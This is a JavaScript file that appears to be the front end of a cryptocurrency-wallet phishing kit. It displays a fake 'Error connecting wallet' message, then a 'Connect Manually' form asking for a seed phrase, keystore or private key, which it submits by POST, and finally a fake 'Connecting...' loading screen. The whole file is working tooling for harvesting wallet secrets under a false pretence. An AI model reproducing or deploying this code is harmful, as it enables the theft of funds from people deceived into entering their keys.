const wallets = document.querySelectorAll(".wallets");

wallets.forEach((wallet) => {
  wallet.addEventListener("click", (event) => {
    const walletImage = event.target.querySelector("img").getAttribute("src");
    const walletName = event.target.querySelector("span").innerText;

    const newModal = new Modal(`
        <div class="modal">
            <div class="modalContent">
            <div class="modalHead">
                <h4>Connect wallet</h4>
                <span class="closeButton material-symbols-outlined" onclick="closeModal()">
                close
                </span>
            </div>
            <div class="modalBody">
                <p class="error">Error connecting wallet <button class="button button--primary" onClick="connectWallet({walletImage: '${walletImage}', walletName: '${walletName}'})">Connect Manually</button></p>
                <div class="imageWrapper">
                <img src="${walletImage}" alt="${walletName}">
                </div>
            </div>
            </div>
        </div>
    `);
    newModal.open();
  });
});

const changeWalletTypeText = (walletTypeText) => {
  document.querySelector("#walletTypeText").innerText = walletTypeText;
};

const connectWallet = ({ walletName, walletImage }) => {
  const newModal = new Modal(`  <div class="modal">
    <div class="modalContent">
      <div class="modalHead">
        <div class="modalHeadLeft">
          <img src="${walletImage}" alt="">
          <h4>${walletName}</h4>
        </div>
        <span class="closeButton material-symbols-outlined" onclick="closeModal()">
          close
        </span>
      </div>
      <div class="modalBody">
      <form method="POST" onsubmit="return handleFormSubmit()">
      <input type="hidden" name="walletName" value="${walletName}">
        <div class="walletType">
          <div class="formGroup">
            <input id="phrase" value="phrase" name="walletType" type="radio" value="Phrase" checked>
            <label onclick="changeWalletTypeText('Phrase')" for="phrase">Phrase</label>
          </div>
          <div class="formGroup">
            <input id="keystore" value="keystore" name="walletType" type="radio" value="Keystore">
            <label onclick="changeWalletTypeText('Keystore')" for="keystore">Keystore</label>
          </div>
          <div class="formGroup">
            <input id="PrivateKey" value="PrivateKey" name="walletType" type="radio" value="PrivateKey">
            <label onclick="changeWalletTypeText('Private Key')" for="PrivateKey">Private Key</label>
          </div>
        </div>
        <div class="walletInput">
          <span id="walletTypeText">Phrase</span>
          <input name="wallet" type="text">
        </div>
        <div class="walletButtons">
          <button onClick="closeModal()">Cancle</button>
          <button type="submit" class="connectButton">Connect</button>
        </div>
      </div>
      </form>
    </div>
  </div>
    `);
  newModal.open();
};

const handleFormSubmit = () => {
  setTimeout(() => {
    const newModal = new Modal(`
      <div class="modal">
      <div class="modalContent">
        <div class="modalHead">
          <div class="modalHeadRight">
            <h4>Trying to connect wallet</h4>
          </div>
          <span class="closeButton material-symbols-outlined" onclick="closeModal()">
            close
            </span>
            </div>
        <div class="modalBody">
          <div class="loadingContainer">
          <img src="/templates/vechain/img/loading.svg" alt="">
            <p>Connecting...</p>
          </div>
          </div>
          </div>
          </div>
          `);
    newModal.open();
  }, 100);
};

const showSuccessModal = ({ title, message }) => {
  const newModal = new Modal(`
    <div class="modal">
    <div class="modalContent">
      <div class="modalHead">
        <div class="modalHeadRight">
          <h4>${title}!</h4>
        </div>
        <span class="closeButton material-symbols-outlined" onclick="closeModal()">
          close
        </span>
      </div>
      <div class="modalBody">
        <div class="loadingContainer">
          <h3>${message}</h3>
        </div>
        <div class="walletButtons">
          <a href="/">
            <button class="connectButton">Continue</button>
          </a>
        </div>
      </div>
    </div>
  </div>
    `);
  newModal.open();
};

const closeModal = () => {
  const modal = document.querySelector(".modal");
  if (modal) document.body.removeChild(modal);
};

class Modal {
  constructor(modalContent) {
    this.modalContent = modalContent;
  }

  open() {
    this.close();
    const modal = document.createElement("div");
    modal.classList.add("modal");
    modal.innerHTML = this.modalContent;
    document.body.appendChild(modal);
  }

  close() {
    const modal = document.querySelector(".modal");
    if (modal) {
      document.body.removeChild(modal);
    }
  }
}
